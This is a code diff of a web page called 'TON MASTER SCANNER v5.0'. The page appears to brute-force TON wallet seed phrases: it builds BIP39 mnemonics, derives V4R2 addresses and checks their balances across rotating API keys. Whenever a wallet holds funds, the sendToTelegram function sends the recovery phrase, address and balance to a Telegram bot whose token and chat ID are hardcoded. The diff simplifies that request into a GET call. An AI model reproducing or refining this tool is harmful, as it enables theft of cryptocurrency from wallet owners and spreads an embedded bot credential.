@@ -2,7 +2,6 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON MASTER SCANNER v5.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
@@ -13,11 +12,11 @@
     <div class="max-w-2xl w-full bg-[#111] p-6 rounded-3xl border border-blue-500/30 shadow-[0_0_100px_rgba(37,99,235,0.1)]">
         <div class="text-center mb-6">
             <h1 class="text-2xl font-black text-blue-500 italic uppercase">TON MASTER SCANNER v5.0</h1>
-            <p id="botStatus" class="text-[10px] text-green-500 uppercase tracking-widest">Algorithm: MNEMONIC-TO-V4R2</p>
+            <p class="text-[10px] text-green-500 uppercase tracking-widest">Algorithm: MNEMONIC-TO-V4R2</p>
         </div>
 
-        <div id="terminal" class="bg-black/80 rounded-2xl p-4 h-80 overflow-y-auto mb-6 text-[11px] border border-slate-800 space-y-1">
-            <p class="text-blue-400">> System Ready. Click Start to Load Modules...</p>
+        <div id="terminal" class="bg-black/80 rounded-2xl p-4 h-80 overflow-y-auto mb-6 text-[11px] border border-slate-800 space-y-1 text-slate-400">
+            <p>> System Ready. Click Start to Load Modules...</p>
         </div>
 
         <div class="space-y-3">
@@ -32,7 +31,6 @@
     </div>
 
     <script>
-        // SIZNING KODINGIZ MANA SHU SCRIPT TEGLARI ICHIDA BO'LISHI KERAK
         const TELEGRAM_BOT_TOKEN = '8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw'; 
         const TELEGRAM_CHAT_ID = '7921132456'; 
         const API_KEYS = [
@@ -43,7 +41,6 @@
 
         let currentKeyIndex = 0;
         let isRunning = false;
-        let checkedCount = 0;
         let bip39Words = []; 
         const terminal = document.getElementById('terminal');
         const tonweb = new TonWeb();
@@ -94,28 +91,21 @@
                     const address = await wallet.getAddress();
                     const addrStr = address.toString(true, true, true);
                     const balance = await checkBalance(addrStr);
-                    checkedCount++;
                     if (balance > 0) {
                         addLog(`💎 TOPILDI! ${addrStr}`, "text-green-400 font-bold");
                         await sendToTelegram(mnemonic.join(" "), addrStr, balance);
                     } else {
-                        addLog(`[${checkedCount}] API:${currentKeyIndex+1} Bo'sh: ${addrStr.substring(0,12)}...`);
+                        addLog(`[API:${currentKeyIndex+1}] Bo'sh: ${addrStr.substring(0,12)}...`);
                     }
                 }
             } catch (err) { console.error(err); }
-            setTimeout(scan, 450); 
+            setTimeout(scan, 500); 
         }
 
         async function sendToTelegram(phrase, address, balance) {
             const ton = balance / 1000000000;
-            const msg = `💰 <b>REAL WALLET FOUND!</b>\n\n📄 <b>Phrase:</b> <code>${phrase}</code>\n🔗 <b>Addr:</b> <code>${address}</code>\n💎 <b>Balance:</b> ${ton} TON`;
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
-                });
-            } catch(e) {}
+            const msg = `💰 REAL WALLET FOUND!\nPhrase: ${phrase}\nAddr: ${address}\nBalance: ${ton} TON`;
+            try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`); } catch(e) {}
         }
 
         document.getElementById('startBtn').addEventListener('click', async function() {
